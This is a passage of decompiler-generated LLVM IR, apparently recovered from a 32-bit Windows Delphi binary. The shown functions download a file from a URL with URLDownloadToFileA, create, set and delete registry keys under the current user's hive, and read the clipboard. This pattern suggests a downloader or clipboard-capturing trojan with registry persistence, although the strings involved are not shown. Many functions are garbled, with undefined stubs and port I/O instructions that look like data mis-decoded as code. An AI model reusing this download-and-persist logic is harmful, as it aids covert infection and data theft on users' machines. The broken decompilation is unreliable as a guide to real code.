  %29 = add i32 %esp.0.reload, -8, !insn.addr !405
  %30 = inttoptr i32 %29 to i32*, !insn.addr !405
  store i32 ptrtoint (i32* @global_var_404c3c to i32), i32* %30, align 4, !insn.addr !405
  %31 = call i32 @function_404ad0(), !insn.addr !406
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !407
  %33 = add i32 %esp.0.reload, -12, !insn.addr !408
  %34 = inttoptr i32 %33 to i32*, !insn.addr !408
  store i32 0, i32* %34, align 4, !insn.addr !408
  %35 = call i32 @function_404ad0(), !insn.addr !409
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !410
  %37 = add i32 %esp.0.reload, -16, !insn.addr !411
  %38 = inttoptr i32 %37 to i32*, !insn.addr !411
  store i32 0, i32* %38, align 4, !insn.addr !411
  %39 = call i32 @"@LStrCatN"(), !insn.addr !412
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !413
  br label %dec_label_pc_404be1, !insn.addr !413

dec_label_pc_404bc8:                              ; preds = %dec_label_pc_404b71
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !414
  %41 = call i32 @"@LStrCat"(), !insn.addr !415
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !415
  br label %dec_label_pc_404be1, !insn.addr !415

dec_label_pc_404be1:                              ; preds = %dec_label_pc_404bc8, %dec_label_pc_404b73, %dec_label_pc_404b3f
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !416
  %43 = add i32 %esi.0.reload, -1, !insn.addr !417
  %44 = icmp eq i32 %43, 0, !insn.addr !417
  %45 = icmp eq i1 %44, false, !insn.addr !418
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !418
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !418
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !418
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !418
  br i1 %45, label %dec_label_pc_404b35, label %dec_label_pc_404be9, !insn.addr !418

dec_label_pc_404be9:                              ; preds = %dec_label_pc_404be1, %dec_label_pc_404ae8
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !419
  %47 = load i32, i32* %46, align 4, !insn.addr !419
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !420
  %48 = add i32 %esp.2.reload, 8, !insn.addr !421
  %49 = inttoptr i32 %48 to i32*, !insn.addr !421
  store i32 4213779, i32* %49, align 4, !insn.addr !421
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !422
  %51 = call i32 @"@LStrClr"(), !insn.addr !423
  ret i32 %51, !insn.addr !424
}

define i32 @function_404c0c() local_unnamed_addr {
dec_label_pc_404c0c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !425
  ret i32 %0, !insn.addr !425
}

define i32 @function_404c11() local_unnamed_addr {
dec_label_pc_404c11:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !426
}

define i32 @function_404c13(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c13:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !427
}

define i32 @function_404c37() local_unnamed_addr {
dec_label_pc_404c37:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !428
  %2 = inttoptr i32 %0 to i32*, !insn.addr !428
  store i32 %1, i32* %2, align 4, !insn.addr !428
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !429
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !429
  %7 = add i8 %4, %6, !insn.addr !429
  %8 = inttoptr i32 %5 to i8*, !insn.addr !429
  store i8 %7, i8* %8, align 1, !insn.addr !429
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !430
  %10 = load i32, i32* %eax, align 4, !insn.addr !430
  %11 = udiv i32 %10, 256, !insn.addr !430
  %12 = trunc i32 %11 to i8, !insn.addr !430
  %13 = add i8 %9, %12, !insn.addr !430
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !430
  %14 = call i32 @function_4036b8(), !insn.addr !431
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !432
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !432
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !432
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !433
  %17 = call i32 @"@LStrCatN"(), !insn.addr !434
  %18 = call i32 @function_4036c8(), !insn.addr !435
  %19 = inttoptr i32 %18 to i32*, !insn.addr !436
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !436
  call void @__writefsdword(i32 0, i32 0), !insn.addr !437
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !438
  ret i32 %21, !insn.addr !439
}

define i32 @function_404c40() local_unnamed_addr {
dec_label_pc_404c40:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404cae() local_unnamed_addr {
dec_label_pc_404cae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !440
  ret i32 %0, !insn.addr !440
}

define i32 @function_404cb3() local_unnamed_addr {
dec_label_pc_404cb3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !441
}

define i32 @function_404cb5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404cb5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !442
}

define i32 @function_404cbf() local_unnamed_addr {
dec_label_pc_404cbf:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !443
  %5 = inttoptr i32 %3 to i32*, !insn.addr !443
  store i32 %4, i32* %5, align 4, !insn.addr !443
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !444
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !444
  %10 = add i8 %7, %9, !insn.addr !444
  %11 = inttoptr i32 %8 to i8*, !insn.addr !444
  store i8 %10, i8* %11, align 1, !insn.addr !444
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !445
  %14 = udiv i32 %1, 256, !insn.addr !445
  %15 = trunc i32 %14 to i8, !insn.addr !445
  %16 = add i8 %13, %15, !insn.addr !445
  %17 = load i32, i32* %edi, align 4, !insn.addr !445
  %18 = inttoptr i32 %17 to i8*, !insn.addr !445
  store i8 %16, i8* %18, align 1, !insn.addr !445
  %19 = load i8, i8* %6, align 4, !insn.addr !446
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !446
  %22 = add i8 %19, %21, !insn.addr !446
  %23 = inttoptr i32 %20 to i8*, !insn.addr !446
  store i8 %22, i8* %23, align 1, !insn.addr !446
  %24 = add i32 %0, -117, !insn.addr !447
  %25 = inttoptr i32 %24 to i8*, !insn.addr !447
  %26 = load i8, i8* %25, align 1, !insn.addr !447
  %27 = trunc i32 %2 to i8, !insn.addr !447
  %28 = add i8 %26, %27, !insn.addr !447
  store i8 %28, i8* %25, align 1, !insn.addr !447
  %29 = trunc i32 %2 to i16, !insn.addr !448
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !448
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !449
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !449
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !449
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !450
  %33 = load i32, i32* @global_var_40969c, align 4, !insn.addr !451
  %34 = add i32 %33, 1, !insn.addr !451
  store i32 %34, i32* @global_var_40969c, align 4, !insn.addr !451
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !452
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !453
  ret i32 0, !insn.addr !454
}

define i32 @function_404ced() local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !455
  ret i32 %0, !insn.addr !455
}

define i32 @function_404cf2() local_unnamed_addr {
dec_label_pc_404cf2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !456
}

define i32 @function_404cf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404cf4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !457
}

define i32 @function_404cf8() local_unnamed_addr {
dec_label_pc_404cf8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !458
  %2 = add i32 %1, -1, !insn.addr !458
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !458
  ret i32 %0, !insn.addr !459
}

define i32 @function_404d00() local_unnamed_addr {
dec_label_pc_404d00:
  %eax.0.reg2mem = alloca i32, !insn.addr !460
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !461
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !462
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !463
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404d8c, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !464
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404d8c, i32 0, i32 0), i32 -2147483647), !insn.addr !465
  %2 = icmp eq i32 %1, 0, !insn.addr !466
  %3 = icmp eq i1 %2, false, !insn.addr !467
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !467
  br i1 %3, label %dec_label_pc_404d7a, label %dec_label_pc_404d35, !insn.addr !467

dec_label_pc_404d35:                              ; preds = %dec_label_pc_404d00
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !468
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !469
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404da8, i32 0, i32 0), i32 -2147483647), !insn.addr !469
  %6 = icmp eq i32 %5, 0, !insn.addr !470
  %7 = icmp eq i1 %6, false, !insn.addr !471
  br i1 %7, label %dec_label_pc_404d71, label %dec_label_pc_404d61, !insn.addr !471

dec_label_pc_404d61:                              ; preds = %dec_label_pc_404d35
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !472
  br label %dec_label_pc_404d71, !insn.addr !472

dec_label_pc_404d71:                              ; preds = %dec_label_pc_404d61, %dec_label_pc_404d35
  %9 = call i32 @function_404374(), !insn.addr !473
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !473
  br label %dec_label_pc_404d7a, !insn.addr !473

dec_label_pc_404d7a:                              ; preds = %dec_label_pc_404d71, %dec_label_pc_404d00
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !474
}

define i32 @function_404d83(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404d83:
  %esp.1.reg2mem = alloca i32, !insn.addr !475
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !475
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !475
  %6 = inttoptr i32 %3 to i32*, !insn.addr !475
  store i32 %5, i32* %6, align 4, !insn.addr !475
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !476
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !476
  %11 = add i8 %8, %10, !insn.addr !476
  %12 = inttoptr i32 %9 to i8*, !insn.addr !476
  store i8 %11, i8* %12, align 1, !insn.addr !476
  %13 = add i32 %1, 122, !insn.addr !477
  %14 = inttoptr i32 %13 to i8*, !insn.addr !477
  %15 = load i8, i8* %14, align 1, !insn.addr !477
  %16 = udiv i32 %4, 256, !insn.addr !477
  %17 = trunc i32 %16 to i8, !insn.addr !477
  %18 = add i8 %15, %17, !insn.addr !477
  store i8 %18, i8* %14, align 1, !insn.addr !477
  %19 = load i8, i8* %7, align 4, !insn.addr !478
  %20 = load i32, i32* %eax, align 4, !insn.addr !478
  %21 = trunc i32 %20 to i8, !insn.addr !478
  %22 = add i8 %19, %21, !insn.addr !478
  %23 = icmp eq i8 %22, 0, !insn.addr !478
  %24 = inttoptr i32 %20 to i8*, !insn.addr !478
  store i8 %22, i8* %24, align 1, !insn.addr !478
  %25 = trunc i32 %3 to i16, !insn.addr !479
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !479
  br i1 %23, label %26, label %dec_label_pc_404d91, !insn.addr !480

; <label>:26:                                     ; preds = %dec_label_pc_404d83
  %27 = call i32 @unknown_4e08(), !insn.addr !480
  br label %dec_label_pc_404d91, !insn.addr !480

dec_label_pc_404d91:                              ; preds = %26, %dec_label_pc_404d83
  %28 = icmp ult i8 %22, %19, !insn.addr !478
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !481
  store i32 %29, i32* %eax, align 4, !insn.addr !481
  br i1 %28, label %dec_label_pc_404df9, label %dec_label_pc_404d94, !insn.addr !482

dec_label_pc_404d94:                              ; preds = %dec_label_pc_404d91
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !483, !insn.addr !478
  %31 = and i8 %30, 1, !insn.addr !478
  %32 = icmp eq i8 %31, 0, !insn.addr !478
  %33 = trunc i32 %arg4 to i16, !insn.addr !484
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !484
  %35 = inttoptr i32 %2 to i32*, !insn.addr !484
  store i32 %34, i32* %35, align 4, !insn.addr !484
  br i1 %32, label %dec_label_pc_404df4, label %dec_label_pc_404d98, !insn.addr !485

dec_label_pc_404d98:                              ; preds = %dec_label_pc_404d94
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !486
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !487
  %36 = add i32 %arg4, 1, !insn.addr !488
  %37 = icmp eq i32 %36, 0, !insn.addr !488
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !489
  br i1 %37, label %dec_label_pc_404dff, label %dec_label_pc_404d9e, !insn.addr !489

dec_label_pc_404d9e:                              ; preds = %dec_label_pc_404d98
  %38 = load i32, i32* %eax, align 4, !insn.addr !490
  %39 = add i32 %38, -1, !insn.addr !490
  store i32 %39, i32* %eax, align 4, !insn.addr !490
  %40 = trunc i32 %36 to i16, !insn.addr !491
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !491
  %42 = load i32, i32* %41, align 4, !insn.addr !491
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !491
  %43 = load i32, i32* %41, align 4, !insn.addr !492
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !492
  %44 = add i32 %arg7, 105, !insn.addr !493
  %45 = inttoptr i32 %44 to i8*, !insn.addr !493
  %46 = load i8, i8* %45, align 1, !insn.addr !493
  %47 = trunc i32 %39 to i8, !insn.addr !493
  %48 = add i8 %46, %47, !insn.addr !493
  %49 = icmp ult i8 %48, %46, !insn.addr !493
  store i8 %48, i8* %45, align 1, !insn.addr !493
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !494
  br i1 %49, label %dec_label_pc_404e1f, label %dec_label_pc_404dac, !insn.addr !494

dec_label_pc_404dac:                              ; preds = %dec_label_pc_404d9e
  %50 = icmp eq i8 %48, 0, !insn.addr !493
  br i1 %50, label %dec_label_pc_404dce, label %dec_label_pc_404dae, !insn.addr !495

dec_label_pc_404dae:                              ; preds = %dec_label_pc_404dac
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !496
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e1f

dec_label_pc_404dce:                              ; preds = %dec_label_pc_404dac
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !497
  %53 = load i32, i32* %52, align 4, !insn.addr !497
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !497
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !498
  store i32 ptrtoint ([27 x i8]* @global_var_404e64 to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !499
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !500
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !501
  %55 = add i32 %arg6, -8, !insn.addr !502
  %56 = inttoptr i32 %55 to i32*, !insn.addr !502
  store i32 0, i32* %56, align 4, !insn.addr !502
  %57 = add i32 %arg6, -12, !insn.addr !503
  %58 = inttoptr i32 %57 to i32*, !insn.addr !503
  store i32 1, i32* %58, align 4, !insn.addr !503
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !504
  ret i32 %57, !insn.addr !504

dec_label_pc_404df4:                              ; preds = %dec_label_pc_404d94
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !505

dec_label_pc_404df9:                              ; preds = %dec_label_pc_404d91
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !506
  %62 = add i8 %60, %61, !insn.addr !506
  %63 = inttoptr i32 %2 to i8*, !insn.addr !506
  store i8 %62, i8* %63, align 1, !insn.addr !506
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !507
  %65 = load i8, i8* %64, align 1, !insn.addr !507
  %66 = udiv i32 %arg3, 256, !insn.addr !507
  %67 = trunc i32 %66 to i8, !insn.addr !507
  %68 = add i8 %65, %67, !insn.addr !507
  store i8 %68, i8* %64, align 1, !insn.addr !507
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !507
  br label %dec_label_pc_404dff, !insn.addr !507

dec_label_pc_404dff:                              ; preds = %dec_label_pc_404df9, %dec_label_pc_404d98
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !508
  %70 = inttoptr i32 %69 to i32*, !insn.addr !508
  store i32 0, i32* %70, align 4, !insn.addr !508
  %71 = add i32 %esp.0, -8, !insn.addr !509
  %72 = inttoptr i32 %71 to i32*, !insn.addr !509
  store i32 0, i32* %72, align 4, !insn.addr !509
  %73 = add i32 %esp.0, -12, !insn.addr !510
  %74 = inttoptr i32 %73 to i32*, !insn.addr !510
  store i32 ptrtoint ([27 x i8]* @global_var_404e64 to i32), i32* %74, align 4, !insn.addr !510
  %75 = add i32 %esp.0, -16, !insn.addr !511
  %76 = inttoptr i32 %75 to i32*, !insn.addr !511
  store i32 -2147483647, i32* %76, align 4, !insn.addr !511
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !512
  %78 = call i32 @function_4034c8(), !insn.addr !513
  %79 = add i32 %78, 1, !insn.addr !514
  %80 = add i32 %esp.0, -20, !insn.addr !515
  %81 = inttoptr i32 %80 to i32*, !insn.addr !515
  store i32 %79, i32* %81, align 4, !insn.addr !515
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !516
  br label %dec_label_pc_404e1f, !insn.addr !516

dec_label_pc_404e1f:                              ; preds = %dec_label_pc_404dae, %dec_label_pc_404dff, %dec_label_pc_404d9e
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !517
  %83 = add i32 %esp.1.reload, -4, !insn.addr !518
  %84 = inttoptr i32 %83 to i32*, !insn.addr !518
  store i32 %82, i32* %84, align 4, !insn.addr !518
  %85 = add i32 %esp.1.reload, -8, !insn.addr !519
  %86 = inttoptr i32 %85 to i32*, !insn.addr !519
  store i32 1, i32* %86, align 4, !insn.addr !519
  %87 = add i32 %esp.1.reload, -12, !insn.addr !520
  %88 = inttoptr i32 %87 to i32*, !insn.addr !520
  store i32 0, i32* %88, align 4, !insn.addr !520
  %89 = add i32 %esp.1.reload, -16, !insn.addr !521
  %90 = inttoptr i32 %89 to i32*, !insn.addr !521
  store i32 ptrtoint ([10 x i8]* @global_var_404e80 to i32), i32* %90, align 4, !insn.addr !521
  %91 = add i32 %arg6, -8, !insn.addr !522
  %92 = inttoptr i32 %91 to i32*, !insn.addr !522
  %93 = load i32, i32* %92, align 4, !insn.addr !522
  %94 = add i32 %esp.1.reload, -20, !insn.addr !523
  %95 = inttoptr i32 %94 to i32*, !insn.addr !523
  store i32 %93, i32* %95, align 4, !insn.addr !523
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !524
  %97 = load i32, i32* %92, align 4, !insn.addr !525
  %98 = add i32 %esp.1.reload, -24, !insn.addr !526
  %99 = inttoptr i32 %98 to i32*, !insn.addr !526
  store i32 %97, i32* %99, align 4, !insn.addr !526
  %100 = call i32 @function_404374(), !insn.addr !527
  %101 = load i32, i32* %99, align 4, !insn.addr !528
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !529
  store i32 4214365, i32* %90, align 4, !insn.addr !530
  %102 = call i32 @"@LStrClr"(), !insn.addr !531
  ret i32 %102, !insn.addr !532
}

define i32 @function_404e56() local_unnamed_addr {
dec_label_pc_404e56:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !533
  ret i32 %0, !insn.addr !533
}

define i32 @function_404e5b() local_unnamed_addr {
dec_label_pc_404e5b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !534
}

define i32 @function_404e5d() local_unnamed_addr {
dec_label_pc_404e5d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !535
}

define i32 @function_404e61(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e61:
  %.reg2mem = alloca i32, !insn.addr !536
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !536
  %5 = inttoptr i32 %2 to i8*, !insn.addr !536
  store i8 %4, i8* %5, align 1, !insn.addr !536
  %6 = add i32 %0, 111, !insn.addr !537
  %7 = inttoptr i32 %6 to i8*, !insn.addr !537
  %8 = load i8, i8* %7, align 1, !insn.addr !537
  %9 = trunc i32 %1 to i8, !insn.addr !537
  %10 = add i8 %8, %9, !insn.addr !537
  %11 = icmp eq i8 %10, 0, !insn.addr !537
  store i8 %10, i8* %7, align 1, !insn.addr !537
  br i1 %11, label %12, label %dec_label_pc_404e69, !insn.addr !538

; <label>:12:                                     ; preds = %dec_label_pc_404e61
  %13 = call i32 @unknown_4ee0(), !insn.addr !538
  br label %dec_label_pc_404e69, !insn.addr !538

dec_label_pc_404e69:                              ; preds = %12, %dec_label_pc_404e61
  %14 = icmp ult i8 %10, %8, !insn.addr !537
  br i1 %14, label %dec_label_pc_404ed1, label %dec_label_pc_404e6c, !insn.addr !539

dec_label_pc_404e6c:                              ; preds = %dec_label_pc_404e69
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !483, !insn.addr !537
  %16 = and i8 %15, 1, !insn.addr !537
  %17 = icmp eq i8 %16, 0, !insn.addr !537
  %18 = trunc i32 %arg4 to i16, !insn.addr !540
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !540
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !540
  store i32 %19, i32* %20, align 4, !insn.addr !540
  br i1 %17, label %dec_label_pc_404ecc, label %dec_label_pc_404e70, !insn.addr !541

dec_label_pc_404e70:                              ; preds = %dec_label_pc_404e6c
  %21 = add i32 %arg4, 1, !insn.addr !542
  %22 = icmp eq i32 %21, 0, !insn.addr !542
  store i32 %arg2, i32* %.reg2mem, !insn.addr !543
  br i1 %22, label %dec_label_pc_404ed7, label %dec_label_pc_404e76, !insn.addr !543

dec_label_pc_404e76:                              ; preds = %dec_label_pc_404e70
  %23 = add i32 %arg2, -1, !insn.addr !544
  %24 = trunc i32 %21 to i16, !insn.addr !545
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !545
  %26 = load i32, i32* %25, align 4, !insn.addr !545
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !545
  %27 = load i32, i32* %25, align 4, !insn.addr !546
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !546
  %28 = add i32 %arg7, 105, !insn.addr !547
  %29 = inttoptr i32 %28 to i8*, !insn.addr !547
  %30 = load i8, i8* %29, align 1, !insn.addr !547
  %31 = trunc i32 %23 to i8, !insn.addr !547
  %32 = add i8 %30, %31, !insn.addr !547
  %33 = icmp eq i8 %32, 0, !insn.addr !547
  store i8 %32, i8* %29, align 1, !insn.addr !547
  br i1 %33, label %dec_label_pc_404ea6, label %dec_label_pc_404e86, !insn.addr !548

dec_label_pc_404e86:                              ; preds = %dec_label_pc_404e76
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !549
  %34 = inttoptr i32 %23 to i8*, !insn.addr !550
  %35 = load i8, i8* %34, align 1, !insn.addr !550
  %36 = add i8 %35, %31, !insn.addr !550
  store i8 %36, i8* %34, align 1, !insn.addr !550
  %37 = add i32 %arg5, 86, !insn.addr !551
  %38 = inttoptr i32 %37 to i8*, !insn.addr !551
  %39 = load i8, i8* %38, align 1, !insn.addr !551
  %40 = trunc i32 %21 to i8, !insn.addr !551
  %41 = add i8 %39, %40, !insn.addr !551
  store i8 %41, i8* %38, align 1, !insn.addr !551
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !552
  %42 = call i32 @"@LStrClr"(), !insn.addr !553
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !554
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !555
  %44 = zext i1 %43 to i32, !insn.addr !556
  ret i32 %44, !insn.addr !556

dec_label_pc_404ea6:                              ; preds = %dec_label_pc_404e76
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !557
  %46 = inttoptr i32 %45 to i8*, !insn.addr !557
  %47 = load i8, i8* %46, align 2, !insn.addr !557
  %48 = mul i8 %47, 2, !insn.addr !557
  store i8 %48, i8* %46, align 2, !insn.addr !557
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !558
  %50 = icmp eq i32* %49, null, !insn.addr !559
  br i1 %50, label %dec_label_pc_404ed1, label %dec_label_pc_404eb6, !insn.addr !560

dec_label_pc_404eb6:                              ; preds = %dec_label_pc_404ea6
  %51 = ptrtoint i32* %49 to i32, !insn.addr !558
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !561
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !562
  %53 = icmp eq i32* %52, null, !insn.addr !563
  br i1 %53, label %dec_label_pc_404ed1, label %dec_label_pc_404ec2, !insn.addr !564

dec_label_pc_404ec2:                              ; preds = %dec_label_pc_404eb6
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !565
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !566
  br label %dec_label_pc_404ecc, !insn.addr !566

dec_label_pc_404ecc:                              ; preds = %dec_label_pc_404ec2, %dec_label_pc_404e6c
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !567
  br label %dec_label_pc_404ed1, !insn.addr !567

dec_label_pc_404ed1:                              ; preds = %dec_label_pc_404ecc, %dec_label_pc_404eb6, %dec_label_pc_404ea6, %dec_label_pc_404e69
  %56 = call i1 @CloseClipboard(), !insn.addr !568
  %57 = sext i1 %56 to i32, !insn.addr !568
  store i32 %57, i32* %.reg2mem, !insn.addr !569
  br label %dec_label_pc_404ed7, !insn.addr !569

